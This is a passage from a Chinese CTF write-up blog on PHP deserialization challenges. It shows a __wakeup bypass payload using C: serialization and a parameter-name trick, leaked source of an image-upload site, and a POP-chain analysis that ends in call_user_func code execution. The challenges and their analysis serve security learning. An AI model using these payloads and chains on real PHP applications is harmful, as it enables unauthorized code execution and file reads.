环境变量</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=False;</span><br><span class="line"><span class="comment">//这里又把start变量赋值为False，所以这里是需要绕过__wakeup魔术方法，不让其执行，只用把属性个数改得大于原来就行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]);  <span class="comment">//这里就是序列化的变量，变量名为sekai_game.run</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后我们整理一下</p>
<p>得到我们的序列化的<code>php</code>代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span> = True;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Sekai_Game</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行得到序列化结果</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>我们修改一下属性值</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><code>【苦笑】但实际是不行的</code></p>
<h3 id="关键考点"><a href="#关键考点" class="headerlink" title="关键考点"></a>关键考点</h3><p>但是</p>
<p><img src="/2022/06/26/Game-wp/image-20221003135130855.png" alt="image-20221003135130855"></p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">PhP 变量不能使用 . ，但是这个变量名很特殊：sekai_game.run. 它同时具有 <span class="literal">_</span> 和 . </span><br><span class="line"></span><br><span class="line">php默认将.所有参数名称转换为<span class="literal">_</span>，因为版本早于<span class="number">8</span>，有一种方法可以解决这个问题，使用[ ，php忽略所有 . ，只转换[为<span class="literal">_</span>参数 ==&gt; ?sekai[game.run=</span><br><span class="line"></span><br><span class="line">**学到了**</span><br></pre></td></tr></table></figure>

<p>所以有效的<code>payload</code>为</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">url/?sekai[game.<span class="attribute">run</span>=xxx</span><br></pre></td></tr></table></figure>



<p>第二步是绕过<code>__wakeup</code></p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">这里我用</span><br><span class="line">O:10:&quot;Sekai_Game&quot;:2:&#123;s:5:&quot;start&quot;;b:1;&#125;</span><br><span class="line"></span><br><span class="line">实际还是绕不过__wakeup函数，就算是属性个数大于原来的属性个数</span><br><span class="line"></span><br><span class="line"><span class="section">==&gt;网上找了以后，发现这个方法是有局限性的，对于高版本的php，这样是无法绕过__wakeup()</span></span><br><span class="line"><span class="section">----</span></span><br><span class="line"></span><br><span class="line">对于高版本的php</span><br><span class="line">可以用C:来绕过</span><br><span class="line"></span><br><span class="line">原理是C:代表这个类实现了serializeable接口，而serializeable不支持<span class="emphasis">__wakeup，就绕过去了</span></span><br><span class="line"><span class="emphasis">==&gt;</span></span><br><span class="line"><span class="emphasis">C:10:&quot;Sekai_</span>Game&quot;:2:&#123;s:5:&quot;start&quot;;b:1;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">但是因为源码中已经赋值，所以不填写数据，</span><br><span class="line">只用实例化Sekai_Game类</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Sekai_Game</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">==&gt;O:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br><span class="line">==&gt;C:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br></pre></td></tr></table></figure>



<p>于是最后的payload为</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">?sekai[game.<span class="built_in">run</span>=C:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2022/06/26/Game-wp/image-20221003162948932.png" alt="image-20221003162948932"></p>
<p><strong>得到flag</strong></p>
<hr>
<h1 id="SKSEC-2022"><a href="#SKSEC-2022" class="headerlink" title="SKSEC 2022"></a>SKSEC 2022</h1><h2 id="1-【Level5】简易的图床"><a href="#1-【Level5】简易的图床" class="headerlink" title="1.【Level5】简易的图床"></a>1.【Level5】简易的图床</h2><figure class="highlight coq"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Hint</span></span><br><span class="line"></span><br><span class="line">说不定在某个地方藏着网站的源码哦，试着拿来代码审计一下吧</span><br></pre></td></tr></table></figure>

<p>看到提示先用<code>dirsearch</code>扫一下看看源码在哪里</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">发现在</span><br><span class="line">http:<span class="regexp">//</span><span class="number">121.43</span>.<span class="number">55.52</span>:<span class="number">10047</span>/www.zip里</span><br></pre></td></tr></table></figure>

<p>得到两个文件<code>index.php</code>和<code>class.php</code>【类文件】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;SK图床&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;</span><br><span class="line">    &lt;link href=&#x27;//fonts.googleapis.com/css?family=Open+Sans:400,300italic,300,400italic,600,600italic,700,700italic,800,800italic&#x27; rel=&#x27;stylesheet&#x27; type=&#x27;text/css&#x27;&gt;</span><br><span class="line">    &lt;link href=&#x27;//fonts.googleapis.com/css?family=Montserrat:400,700&#x27; rel=&#x27;stylesheet&#x27; type=&#x27;text/css&#x27;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot; /&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;keywords&quot; content=&quot;File Upload widget Widget Responsive, Login Form Web Template, Flat Pricing Tables, Flat Drop-Downs, Sign-Up Web Templates, Flat Web Templates, Login Sign-up Responsive Web Template, Smartphone Compatible Web Template, Free Web Designs for Nokia, Samsung, LG, Sony Ericsson, Motorola Web Design&quot; /&gt;</span><br><span class="line">    &lt;script type=&quot;application/x-javascript&quot;&gt; addEventListener(&quot;load&quot;, function() &#123; setTimeout(hideURLbar, 0); &#125;, false); function hideURLbar()&#123; window.scrollTo(0,1); &#125; &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;SK图床&lt;/h1&gt;</span><br><span class="line">&lt;div class=&quot;agile-its&quot;&gt;</span><br><span class="line">    &lt;h2&gt;Image Upload&lt;/h2&gt;</span><br><span class="line">    &lt;div class=&quot;w3layouts&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;photos-upload-view&quot;&gt;</span><br><span class="line">            &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">                &lt;label for=&quot;file&quot;&gt;选择文件&lt;/label&gt;</span><br><span class="line">                &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">                &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">            &lt;div id=&quot;messages&quot;&gt;</span><br><span class="line">                &lt;p&gt;</span><br><span class="line">                    &lt;?php</span><br><span class="line">                    include(&quot;class.php&quot;);</span><br><span class="line">                    if(isset($_GET[&#x27;img_name&#x27;]))&#123;</span><br><span class="line">                        $down = new check_img();</span><br><span class="line">                        echo $down-&gt;img_check();</span><br><span class="line">                    &#125;</span><br><span class="line">                    if(isset($_FILES[&quot;file&quot;][&quot;name&quot;]))&#123;</span><br><span class="line"></span><br><span class="line">                        $up = new upload();</span><br><span class="line">                        echo $up-&gt;start();</span><br><span class="line">                    &#125;</span><br><span class="line">                    ?&gt;</span><br><span class="line">                &lt;/p&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;clearfix&quot;&gt;&lt;/div&gt;</span><br><span class="line">        &lt;script src=&quot;js/filedrag.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;footer&quot;&gt;</span><br><span class="line">    &lt;p&gt; Powerded by  &lt;a href=&quot;http://w3layouts.com/&quot;&gt;y1zh3e7 的 图床&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>我们只把它的<code>php</code>代码取出来</p>
<p><code>【我顺便就在其中对代码进行审计】</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>])) &#123;</span><br><span class="line">      <span class="variable">$down</span> = <span class="keyword">new</span> <span class="title function_ invoke__">check_img</span>(); <span class="comment">//实例化</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">class check_img&#123;</span></span><br><span class="line"><span class="comment">    public $img_name;</span></span><br><span class="line"><span class="comment">    public function __construct()&#123;</span></span><br><span class="line"><span class="comment">        $this-&gt;img_name = $_GET[&#x27;img_name&#x27;];</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"> 这个类主要是把传入的图片名赋值给公共的变量img_name</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$down</span>-&gt;<span class="title function_ invoke__">img_check</span>();</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>])) &#123;</span><br><span class="line">     <span class="variable">$up</span> = <span class="keyword">new</span> <span class="title function_ invoke__">upload</span>();</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$up</span>-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后是<code>class.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext = <span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Valid_ext = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span>&#123;         </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image already exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;ext, <span class="variable">$this</span>-&gt;Valid_ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Only Image Can Be Uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Upload succsess!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">check_img</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;img_name = <span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">img_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;img_name))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image not exsists&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="DASCTF-X-GFCTF-2022十月挑战赛"><a href="#DASCTF-X-GFCTF-2022十月挑战赛" class="headerlink" title="DASCTF X GFCTF 2022十月挑战赛"></a>DASCTF X GFCTF 2022十月挑战赛</h1><h2 id="1-EasyPOP"><a href="#1-EasyPOP" class="headerlink" title="1.EasyPOP"></a>1.EasyPOP</h2><p>一道构造<code>pop</code>链的题，拿来练习一下分析能力</p>
<p>做反序列构造<code>pop</code>链最重要还是要会联想，从而触发方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;cmd, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$time</span> = <span class="string">&quot;Two and a half years&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ctf</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ctf = <span class="variable">$ctf</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line"> <span class="comment">//show类有this-&gt;ctf-&gt;show() 联想一下__call函数，或者看看其他类有show函数没，在secret_code类中发现有show函数，而其函数内语句会触发__get魔术，而__get魔术会触发fine类的__invoke魔术，其中的call_user_func就是实现反序列化命令执行的关键，所以这里并不触发__call魔术</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf . <span class="string">&quot;: Duration of practice: &quot;</span> . <span class="variable language_">$this</span>-&gt;time;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&quot;hint is depend on you&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="variable">$name</span>();</span><br><span class="line"><span class="comment">//sorry类的__get函数有$name()，联想到__invoke，fine类的__invoke 函数有call_user_func函数，也就是突破口</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password == <span class="variable language_">$this</span>-&gt;name) &#123;</span><br><span class="line">    <span class="comment">//这里的password和name就需要外部实例化后赋值为相同的，因为这样才能通过下面语句调用魔术方法，而不执行else语句</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;hint;</span><br><span class="line">        <span class="comment">//sorry的析构函数有echo $this-&gt;hint 联想一下__toString函数，在Show类中</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;jay&quot;</span>) &#123;</span><br><span class="line">            secret_code::<span class="title function_ invoke__">secret</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This is our code&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPassword</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setPassword</span>(<span class="params"><span class="variable">$password</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">secret</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="string">&quot;hint.php&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">hint</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$num</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;code-&gt;secret;  </span><br><span class="line"><span class="comment">//secret_code类的show函数有this-&gt;code-&gt;secret，secret属性是所有类都没有的，自然联想到__get，在Sorry类里</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setPassword</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="string">&quot;Ctfer&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>pop链的构造</p>
<p>切入口 sorry类的析构函数，<strong>突破口fine类的__invoke函数中的call_user_func函数</strong></p>
<p><code>sorry.__destruct -&gt; show.__toString</code><br><code>-&gt;</code><br><code>secret.show()</code><br><code>-&gt;</code><br><code>sorry.__get -&gt; fine.__invoke</code><br><code>-&gt;</code><br><code>call_user_func函数</code></p>
<p>#call_user_func(a,b) — 把第一个参数作为回调函数调用, 其余参数是回调函数的参数<br>#也就是把a当作函数，把b当作传入a函数的参数【如call_user_func(assert,phpinfo()),就会执行代码phpinfo()】</p>
</blockquote>
<p>所以<code>payload</code>为</p>
